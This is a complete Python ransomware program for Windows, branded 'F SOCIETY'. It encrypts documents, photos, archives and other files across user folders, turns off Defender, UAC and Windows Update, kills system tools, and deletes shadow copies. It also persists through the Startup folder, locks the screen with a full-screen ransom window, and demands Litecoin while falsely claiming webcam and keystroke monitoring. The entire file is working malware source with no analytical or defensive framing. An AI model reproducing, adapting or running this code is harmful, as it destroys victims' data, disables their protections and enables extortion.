import os
import base64
import ctypes
import subprocess
import sys
import time
import shutil
import re
import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import winreg
import threading
import random
import socket

# --- Configuration ---
LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
RANSOM_AMOUNT = "$250 USD in Litecoin"
DECRYPT_KEY = "agent77"

# --- Global storage for key/iv ---
encryption_key = None
encryption_iv = None

# --- Core Encryption Functions ---
def generate_key():
    return get_random_bytes(32)

def generate_iv():
    return get_random_bytes(16)

def encrypt_file(file_path, key, iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        with open(file_path, 'wb') as f:
            f.write(iv + encrypted_data)
        return True
    except:
        return False

def decrypt_file(file_path, key, iv):
    try:
        with open(file_path, 'rb') as f:
            iv_data = f.read(16)
            encrypted_data = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv_data)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        original_path = file_path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(file_path)
        return True
    except:
        return False

def encrypt_directory(directory, key, iv, extensions=None):
    if extensions is None:
        extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
            '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd',
            '.mp3', '.wav', '.flac', '.aac', '.ogg',
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
            '.exe', '.dll', '.msi', '.apk', '.app', '.deb', '.rpm',
            '.php', '.html', '.htm', '.css', '.js', '.py', '.cpp', '.c',
            '.java', '.class', '.jar', '.sql', '.db', '.mdb', '.accdb',
            '.ps1', '.bat', '.cmd', '.sh', '.bash',
            '.ai', '.eps', '.svg', '.indd', '.cdr', '.dxf', '.dwg',
            '.iso', '.img', '.vhd', '.vmdk', '.ova', '.ovf',
            '.pst', '.ost', '.msg', '.eml', '.mdb', '.nsf'
        ]
    
    count = 0
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            ext = os.path.splitext(file)[1].lower()
            if ext in extensions and not file.endswith('.encrypted'):
                if encrypt_file(file_path, key, iv):
                    count += 1
                try:
                    os.rename(file_path, file_path + '.encrypted')
                except:
                    pass
    return count

def decrypt_all_files(key, iv):
    count = 0
    for directory in get_target_directories():
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith('.encrypted'):
                    file_path = os.path.join(root, file)
                    if decrypt_file(file_path, key, iv):
                        count += 1
    return count

def get_target_directories():
    user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
    paths = [
        user_profile + '\\Desktop',
        user_profile + '\\Documents',
        user_profile + '\\Downloads',
        user_profile + '\\Pictures',
        user_profile + '\\Music',
        user_profile + '\\Videos',
        user_profile + '\\AppData\\Local',
        user_profile + '\\AppData\\Roaming',
        user_profile + '\\Favorites',
        user_profile + '\\OneDrive',
        'C:\\ProgramData',
        'C:\\Users\\Public\\Documents',
        'C:\\Users\\Public\\Desktop'
    ]
    return [p for p in paths if os.path.exists(p)]

# --- System Manipulation ---
def disable_security():
    try:
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableArchiveScanning $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        try:
            key = winreg.HKEY_LOCAL_MACHINE
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(handle)
        except:
            pass
        subprocess.run('net stop wuauserv', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('taskkill /f /im Taskmgr.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('taskkill /f /im regedit.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('taskkill /f /im cmd.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('taskkill /f /im powershell.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def delete_shadow_copies():
    try:
        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('wmic shadowcopy delete', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def change_wallpaper():
    try:
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (1920, 1080), color='black')
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("arial.ttf", 72)
            font2 = ImageFont.truetype("arial.ttf", 48)
            font3 = ImageFont.truetype("arial.ttf", 30)
        except:
            font = ImageFont.load_default()
            font2 = ImageFont.load_default()
            font3 = ImageFont.load_default()
        text = "F SOCIETY\nYOUR FILES ARE ENCRYPTED"
        draw.text((100, 300), text, fill=(255, 0, 0), font=font)
        draw.text((100, 550), f"Pay {RANSOM_AMOUNT} in Litecoin", fill=(255, 255, 255), font=font2)
        draw.text((100, 650), LTC_ADDRESS, fill=(0, 255, 0), font=font3)
        draw.text((100, 750), "Run the program and enter the decryption key.", fill=(255, 255, 0), font=font3)
        wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
        img.save(wallpaper_path)
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Control Panel\Desktop"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "Wallpaper", 0, winreg.REG_SZ, wallpaper_path)
        winreg.SetValueEx(handle, "WallpaperStyle", 0, winreg.REG_SZ, "2")
        winreg.SetValueEx(handle, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(handle)
    except:
        pass

def create_ransom_note(key_hex, iv_hex):
    note = f"""
=============================================================
          F SOCIETY RANSOMWARE - AES-256 ENCRYPTION
=============================================================

Your files have been encrypted with AES-256-CBC.

To recover your files, pay {RANSOM_AMOUNT} in Litecoin to:

Litecoin Address: {LTC_ADDRESS}

IMPORTANT:
- You have 72 hours to pay
- After 72 hours, the key will be destroyed

DECRYPTION KEY (DO NOT LOSE):
Key: {key_hex}
IV:  {iv_hex}

TO DECRYPT:
Run this program and enter the decryption key: {DECRYPT_KEY}

=============================================================
            F SOCIETY - WE ARE EVERYWHERE
=============================================================
"""
    desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
    with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
        f.write(note)
    
    hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
    with open(hidden_path, 'w') as f:
        f.write(f"{key_hex}\n{iv_hex}\n{DECRYPT_KEY}")

def run_encryption():
    global encryption_key, encryption_iv
    try:
        key = generate_key()
        iv = generate_iv()
        encryption_key = key
        encryption_iv = iv
        key_hex = base64.b64encode(key).decode()
        iv_hex = base64.b64encode(iv).decode()
        
        disable_security()
        delete_shadow_copies()
        change_wallpaper()
        
        for directory in get_target_directories():
            try:
                encrypt_directory(directory, key, iv)
            except:
                pass
        
        create_ransom_note(key_hex, iv_hex)
        
        try:
            startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
        except:
            pass
    except:
        pass

def lock_windows_key():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        try:
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        except:
            handle = winreg.CreateKey(key, subkey)
        winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
    except:
        pass

def unlock_windows_key():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(handle)
    except:
        pass

# --- Full-Screen UI ---
class RansomwareUI:
    def __init__(self, root):
        self.root = root
        self.root.title("F SOCIETY RANSOMWARE")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')
        
        lock_windows_key()
        
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<F11>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind("<Alt-F4>", lambda e: "break")
        
        self.time_left = 72 * 3600
        self.timer_id = None
        self.hacker_index = 0
        
        self.create_widgets()
        self.start_timer()
        self.root.after(100, self.start_encryption)
    
    def create_widgets(self):
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        top_frame = tk.Frame(main_frame, bg='black')
        top_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(top_frame, text="F SOCIETY RANSOMWARE", 
                 font=('Arial', 48, 'bold'), fg='red', bg='black').pack()
        
        self.timer_label = tk.Label(top_frame, text="⏰ TIME REMAINING: 72:00:00", 
                                    font=('Arial', 24), fg='yellow', bg='black')
        self.timer_label.pack(pady=5)
        
        webcam_frame = tk.Frame(main_frame, bg='black')
        webcam_frame.pack(pady=5)
        
        self.webcam_led = tk.Label(webcam_frame, text="●", font=('Arial', 24), fg='red', bg='black')
        self.webcam_led.pack(side=tk.LEFT)
        tk.Label(webcam_frame, text=" WEBCAM ACTIVE", font=('Arial', 14), fg='red', bg='black').pack(side=tk.LEFT)
        self.blink_led()
        
        mask_art = r"""
        .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.
        ::::::::::: ::::::::::: ::::::::::: ::::::::::: ::::::::::: :::::::::::
        ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'
        ::::         ::::         ::::         ::::         ::::         ::::
        ::::         ::::         ::::         ::::         ::::         ::::
        ::::         ::::         ::::         ::::         ::::         ::::
        ::::..       ::::..       ::::..       ::::..       ::::..       ::::..
        ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::
        """
        tk.Label(main_frame, text=mask_art, font=('Courier', 8), 
                 fg='red', bg='black', justify='center').pack(pady=10)
        
        info = f"""
        DECRYPTION KEY: {DECRYPT_KEY}
        Litecoin: {LTC_ADDRESS}
        Amount: {RANSOM_AMOUNT}
        You have 72 hours to pay.
        """
        tk.Label(main_frame, text=info, font=('Arial', 14), 
                 fg='white', bg='black', justify='left').pack(pady=10)
        
        progress_frame = tk.Frame(main_frame, bg='black')
        progress_frame.pack(pady=10, fill=tk.X)
        
        self.progress_label = tk.Label(progress_frame, text="[!] DELETING BACKUP FILES...", 
                                       font=('Arial', 12), fg='red', bg='black')
        self.progress_label.pack()
        
        self.progress_bar = ttk.Progressbar(progress_frame, length=500, mode='determinate', maximum=100)
        self.progress_bar.pack(pady=5)
        self.fake_progress()
        
        self.hacker_text = tk.Label(main_frame, text="", font=('Courier', 11), 
                                    fg='#00ff00', bg='black')
        self.hacker_text.pack(pady=5)
        self.scroll_hacker_text()
        
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            username = os.environ.get('USERNAME', 'Unknown')
            info = f"NAME: {username} | HOST: {hostname} | IP: {ip} | CAMERA: ACTIVE"
            tk.Label(main_frame, text=info, font=('Courier', 9), 
                     fg='#ff4444', bg='black').pack(pady=5)
        except:
            pass
        
        file_frame = tk.Frame(main_frame, bg='black')
        file_frame.pack(pady=10, fill=tk.BOTH, expand=True)
        
        tk.Label(file_frame, text="[ENCRYPTED FILES]", font=('Arial', 12), 
                 fg='red', bg='black').pack()
        
        self.file_listbox = tk.Listbox(file_frame, height=4, bg='black', fg='red', 
                                       font=('Consolas', 9), selectbackground='dark red')
        self.file_listbox.pack(padx=20, fill=tk.BOTH, expand=True)
        for f in ['passwords.xlsx', 'bank_transfer.pdf', 'family_photos.zip', 'wallet.dat']:
            self.file_listbox.insert(tk.END, f"🔒 {f}")
        
        decrypt_frame = tk.Frame(main_frame, bg='black')
        decrypt_frame.pack(pady=10, fill=tk.X)
        
        tk.Label(decrypt_frame, text="Enter Key:", font=('Arial', 16), 
                 fg='white', bg='black').pack(side=tk.LEFT, padx=10)
        
        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=25, 
                                  show='*', bg='white', fg='black')
        self.key_entry.pack(side=tk.LEFT, padx=10)
        self.key_entry.focus()
        self.key_entry.bind('<Return>', lambda e: self.decrypt_action())
        
        tk.Button(decrypt_frame, text="DECRYPT", font=('Arial', 14, 'bold'), 
                  bg='red', fg='white', command=self.decrypt_action, padx=20, pady=5).pack(side=tk.LEFT, padx=20)
        
        self.status_text = scrolledtext.ScrolledText(main_frame, height=4, 
                                                     font=('Arial', 10), bg='black', fg='#00ff00')
        self.status_text.pack(pady=10, fill=tk.BOTH, expand=True)
        self.status_text.insert(tk.END, "[+] Ready. Enter decryption key.\n")
        self.status_text.config(state='disabled')
    
    def blink_led(self):
        try:
            current = self.webcam_led.cget('fg')
            self.webcam_led.config(fg='dark red' if current == 'red' else 'red')
            self.root.after(500, self.blink_led)
        except:
            pass
    
    def fake_progress(self):
        try:
            val = self.progress_bar['value'] + random.randint(5, 15)
            if val > 100:
                val = 100
            self.progress_bar['value'] = val
            self.progress_label.config(text=f"[!] DELETING BACKUP FILES... {int(val)}%")
            if val < 100:
                self.root.after(random.randint(1000, 3000), self.fake_progress)
            else:
                self.progress_label.config(text="[✓] BACKUP DELETION COMPLETE", fg="light green")
        except:
            pass
    
    def scroll_hacker_text(self):
        try:
            msgs = ["ACCESSING SYSTEM...", "ENCRYPTING DATA...", "DELETING SHADOW COPIES...", 
                    "DISABLING SECURITY...", "EXFILTRATING DATA...", "MONITORING KEYSTROKES..."]
            self.hacker_text.config(text=f"> {msgs[self.hacker_index % len(msgs)]}")
            self.hacker_index += 1
            self.root.after(2000, self.scroll_hacker_text)
        except:
            pass
    
    def start_timer(self):
        self.update_timer()
    
    def update_timer(self):
        try:
            if self.time_left <= 0:
                self.timer_label.config(text="⏰ TIME EXPIRED", fg="red")
                return
            h = self.time_left // 3600
            m = (self.time_left % 3600) // 60
            s = self.time_left % 60
            self.timer_label.config(text=f"⏰ TIME REMAINING: {h:02d}:{m:02d}:{s:02d}")
            self.time_left -= 1
            self.timer_id = self.root.after(1000, self.update_timer)
        except:
            pass
    
    def start_encryption(self):
        self.update_status("[+] Encrypting files in background...")
        threading.Thread(target=run_encryption, daemon=True).start()
    
    def update_status(self, msg):
        try:
            self.status_text.config(state='normal')
            self.status_text.insert(tk.END, msg + "\n")
            self.status_text.see(tk.END)
            self.status_text.config(state='disabled')
        except:
            pass
    
    def decrypt_action(self):
        global encryption_key, encryption_iv
        key_input = self.key_entry.get().strip()
        
        if not key_input:
            messagebox.showerror("Error", "Enter the decryption key.")
            return
        
        if key_input != DECRYPT_KEY:
            messagebox.showerror("Invalid Key", "Wrong decryption key.")
            self.update_status("[-] Invalid key.")
            return
        
        self.update_status("[+] Key accepted. Decrypting...")
        
        try:
            if encryption_key is not None and encryption_iv is not None:
                count = decrypt_all_files(encryption_key, encryption_iv)
                if count > 0:
                    self.update_status(f"[+] Decrypted {count} files!")
                    self.finish_decryption()
                    return
            
            hidden = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
            if os.path.exists(hidden):
                with open(hidden, 'r') as f:
                    lines = f.readlines()
                    if len(lines) >= 3 and lines[2].strip() == DECRYPT_KEY:
                        key = base64.b64decode(lines[0].strip())
                        iv = base64.b64decode(lines[1].strip())
                        count = decrypt_all_files(key, iv)
                        self.update_status(f"[+] Decrypted {count} files!")
                        self.finish_decryption()
                        return
            
            note = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop\\README_FSOCIETY.txt'
            if os.path.exists(note):
                with open(note, 'r') as f:
                    content = f.read()
                    km = re.search(r'Key: (\S+)', content)
                    im = re.search(r'IV: (\S+)', content)
                    if km and im:
                        key = base64.b64decode(km.group(1))
                        iv = base64.b64decode(im.group(1))
                        count = decrypt_all_files(key, iv)
                        self.update_status(f"[+] Decrypted {count} files!")
                        self.finish_decryption()
                        return
            
            self.update_status("[-] Could not find encryption key.")
            messagebox.showerror("Error", "Key not found.")
        except Exception as e:
            self.update_status(f"[-] Error: {str(e)}")
            messagebox.showerror("Error", str(e))
    
    def finish_decryption(self):
        try:
            desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
            for f in ['README_FSOCIETY.txt']:
                try: os.remove(desktop + '\\' + f)
                except: pass
            try: os.remove(os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key')
            except: pass
            try: ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
            except: pass
            if self.timer_id:
                self.root.after_cancel(self.timer_id)
            self.timer_label.config(text="✅ DECRYPTION COMPLETE", fg="light green")
            unlock_windows_key()
            messagebox.showinfo("Success", "All files decrypted!")
            self.update_status("[+] Done. You can close this window.")
        except:
            pass

def main():
    root = tk.Tk()
    app = RansomwareUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
